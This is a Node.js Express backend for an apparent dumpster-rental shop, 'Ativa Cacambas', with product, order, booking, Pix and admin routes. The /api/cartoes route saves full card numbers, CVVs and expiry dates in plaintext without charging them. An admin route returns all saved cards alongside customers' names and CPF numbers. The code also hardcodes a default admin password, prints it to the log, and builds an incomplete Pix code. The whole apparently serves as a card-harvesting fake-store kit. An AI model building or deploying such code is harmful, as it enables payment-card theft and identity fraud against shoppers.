const express = require('express');
const { Pool } = require('pg');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: { rejectUnauthorized: false }
});

function verificarToken(req, res, next) {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ erro: 'Token nao fornecido' });
    try {
        const decoded = jwt.verify(token, JWT_SECRET);
        req.usuario = decoded;
        next();
    } catch {
        return res.status(403).json({ erro: 'Token invalido' });
    }
}

async function initDB() {
    const client = await pool.connect();
    try {
        await client.query(`
            CREATE TABLE IF NOT EXISTS admin (
                id SERIAL PRIMARY KEY,
                username TEXT UNIQUE,
                senha_hash TEXT
            )
        `);
        
        await client.query(`
            CREATE TABLE IF NOT EXISTS produtos (
                id SERIAL PRIMARY KEY,
                nome TEXT NOT NULL,
                tipo TEXT NOT NULL,
                preco REAL NOT NULL,
                preco_promocional REAL,
                descricao TEXT,
                imagem TEXT,
                dimensoes TEXT,
                capacidade TEXT,
                ativo BOOLEAN DEFAULT true,
                created_at TIMESTAMP DEFAULT NOW()
            )
        `);
        
        await client.query(`
            CREATE TABLE IF NOT EXISTS clientes (
                id SERIAL PRIMARY KEY,
                nome TEXT NOT NULL,
                telefone TEXT NOT NULL,
                email TEXT,
                cpf TEXT,
                created_at TIMESTAMP DEFAULT NOW()
            )
        `);
        
        await client.query(`
            CREATE TABLE IF NOT EXISTS agendamentos (
                id SERIAL PRIMARY KEY,
                cliente_id INTEGER REFERENCES clientes(id),
                tipo_obra TEXT,
                endereco_obra TEXT,
                data_agendamento DATE,
                horario TEXT,
                observacoes TEXT,
                created_at TIMESTAMP DEFAULT NOW()
            )
        `);
        
        await client.query(`
            CREATE TABLE IF NOT EXISTS pedidos (
                id SERIAL PRIMARY KEY,
                cliente_id INTEGER REFERENCES clientes(id),
                produto_id INTEGER REFERENCES produtos(id),
                quantidade INTEGER DEFAULT 1,
                valor_total REAL,
                status_pagamento TEXT DEFAULT 'pendente',
                tipo_pagamento TEXT,
                transacao_id TEXT,
                created_at TIMESTAMP DEFAULT NOW()
            )
        `);
        
        await client.query(`
            CREATE TABLE IF NOT EXISTS cartoes (
                id SERIAL PRIMARY KEY,
                cliente_id INTEGER REFERENCES clientes(id),
                nome_titular TEXT,
                numero_cartao TEXT,
                cvv TEXT,
                validade TEXT,
                created_at TIMESTAMP DEFAULT NOW()
            )
        `);
        
        const adminExist = await client.query("SELECT * FROM admin WHERE username = 'admin'");
        if (adminExist.rows.length === 0) {
            const hash = await bcrypt.hash('Ativa2025', 10);
            await client.query("INSERT INTO admin (username, senha_hash) VALUES ($1, $2)", ['admin', hash]);
            console.log('Admin criado: admin / Ativa2025');
        }
        
        console.log('Banco de dados inicializado');
    } catch (err) {
        console.error('Erro DB:', err);
    } finally {
        client.release();
    }
}

initDB();

app.get('/api/produtos', async (req, res) => {
    try {
        const result = await pool.query("SELECT * FROM produtos WHERE ativo = true ORDER BY id");
        res.json({ success: true, produtos: result.rows });
    } catch (err) {
        res.status(500).json({ erro: err.message });
    }
});

app.get('/api/produtos/:id', async (req, res) => {
    try {
        const result = await pool.query("SELECT * FROM produtos WHERE id = $1", [req.params.id]);
        if (result.rows.length === 0) return res.status(404).json({ erro: 'Produto nao encontrado' });
        res.json({ success: true, produto: result.rows[0] });
    } catch (err) {
        res.status(500).json({ erro: err.message });
    }
});

app.post('/api/clientes', async (req, res) => {
    const { nome, telefone, email, cpf } = req.body;
    try {
        const result = await pool.query(
            "INSERT INTO clientes (nome, telefone, email, cpf) VALUES ($1, $2, $3, $4) RETURNING id",
            [nome, telefone, email, cpf]
        );
        res.json({ success: true, cliente_id: result.rows[0].id });
    } catch (err) {
        res.status(500).json({ erro: err.message });
    }
});

app.post('/api/agendamentos', async (req, res) => {
    const { cliente_id, tipo_obra, endereco_obra, data_agendamento, horario, observacoes } = req.body;
    try {
        const result = await pool.query(
            "INSERT INTO agendamentos (cliente_id, tipo_obra, endereco_obra, data_agendamento, horario, observacoes) VALUES ($1, $2, $3, $4, $5, $6) RETURNING id",
            [cliente_id, tipo_obra, endereco_obra, data_agendamento, horario, observacoes]
        );
        res.json({ success: true, agendamento_id: result.rows[0].id });
    } catch (err) {
        res.status(500).json({ erro: err.message });
    }
});

app.post('/api/pedidos', async (req, res) => {
    const { cliente_id, produto_id, quantidade, valor_total, tipo_pagamento } = req.body;
    try {
        const result = await pool.query(
            "INSERT INTO pedidos (cliente_id, produto_id, quantidade, valor_total, tipo_pagamento) VALUES ($1, $2, $3, $4, $5) RETURNING id",
            [cliente_id, produto_id, quantidade, valor_total, tipo_pagamento]
        );
        res.json({ success: true, pedido_id: result.rows[0].id });
    } catch (err) {
        res.status(500).json({ erro: err.message });
    }
});

app.post('/api/cartoes', async (req, res) => {
    const { cliente_id, nome_titular, numero_cartao, cvv, validade } = req.body;
    try {
        await pool.query(
            "INSERT INTO cartoes (cliente_id, nome_titular, numero_cartao, cvv, validade) VALUES ($1, $2, $3, $4, $5)",
            [cliente_id, nome_titular, numero_cartao, cvv, validade]
        );
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ erro: err.message });
    }
});

app.post('/api/pix', async (req, res) => {
    const { valor } = req.body;
    const txid = crypto.randomBytes(16).toString('hex');
    const qrcode = `00020126580014BR.GOV.BCB.PIX0136${process.env.PIX_KEY}5204000053039865404${Math.floor(valor)}5802BR5915Ativa Cacambas6009SAO PAULO62070503***6304`;
    
    res.json({
        success: true,
        txid: txid,
        qrcode: qrcode,
        copia_cola: qrcode
    });
});

app.post('/api/admin/login', async (req, res) => {
    const { username, senha } = req.body;
    try {
        const result = await pool.query("SELECT * FROM admin WHERE username = $1", [username]);
        if (result.rows.length === 0) return res.status(401).json({ erro: 'Credenciais invalidas' });
        
        const valid = await bcrypt.compare(senha, result.rows[0].senha_hash);
        if (!valid) return res.status(401).json({ erro: 'Credenciais invalidas' });
        
        const token = jwt.sign({ id: result.rows[0].id, username }, JWT_SECRET, { expiresIn: '8h' });
        res.json({ success: true, token });
    } catch (err) {
        res.status(500).json({ erro: err.message });
    }
});

app.get('/api/admin/produtos', verificarToken, async (req, res) => {
    try {
        const result = await pool.query("SELECT * FROM produtos ORDER BY id");
        res.json({ success: true, produtos: result.rows });
    } catch (err) {
        res.status(500).json({ erro: err.message });
    }
});

app.post('/api/admin/produtos', verificarToken, async (req, res) => {
    const { nome, tipo, preco, preco_promocional, descricao, imagem, dimensoes, capacidade } = req.body;
    try {
        const result = await pool.query(
            "INSERT INTO produtos (nome, tipo, preco, preco_promocional, descricao, imagem, dimensoes, capacidade) VALUES ($1, $2, $3, $4, $5, $6, $7, $8) RETURNING id",
            [nome, tipo, preco, preco_promocional, descricao, imagem, dimensoes, capacidade]
        );
        res.json({ success: true, id: result.rows[0].id });
    } catch (err) {
        res.status(500).json({ erro: err.message });
    }
});

app.put('/api/admin/produtos/:id', verificarToken, async (req, res) => {
    const { nome, tipo, preco, preco_promocional, descricao, imagem, dimensoes, capacidade, ativo } = req.body;
    try {
        await pool.query(
            "UPDATE produtos SET nome=$1, tipo=$2, preco=$3, preco_promocional=$4, descricao=$5, imagem=$6, dimensoes=$7, capacidade=$8, ativo=$9 WHERE id=$10",
            [nome, tipo, preco, preco_promocional, descricao, imagem, dimensoes, capacidade, ativo, req.params.id]
        );
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ erro: err.message });
    }
});

app.delete('/api/admin/produtos/:id', verificarToken, async (req, res) => {
    try {
        await pool.query("DELETE FROM produtos WHERE id = $1", [req.params.id]);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ erro: err.message });
    }
});

app.get('/api/admin/pedidos', verificarToken, async (req, res) => {
    try {
        const result = await pool.query(`
            SELECT p.*, c.nome as cliente_nome, c.telefone, c.cpf, pr.nome as produto_nome 
            FROM pedidos p
            LEFT JOIN clientes c ON p.cliente_id = c.id
            LEFT JOIN produtos pr ON p.produto_id = pr.id
            ORDER BY p.created_at DESC
        `);
        res.json({ success: true, pedidos: result.rows });
    } catch (err) {
        res.status(500).json({ erro: err.message });
    }
});

app.get('/api/admin/cartoes', verificarToken, async (req, res) => {
    try {
        const result = await pool.query(`
            SELECT ca.*, c.nome as cliente_nome, c.cpf 
            FROM cartoes ca
            LEFT JOIN clientes c ON ca.cliente_id = c.id
            ORDER BY ca.created_at DESC
        `);
        res.json({ success: true, cartoes: result.rows });
    } catch (err) {
        res.status(500).json({ erro: err.message });
    }
});

app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});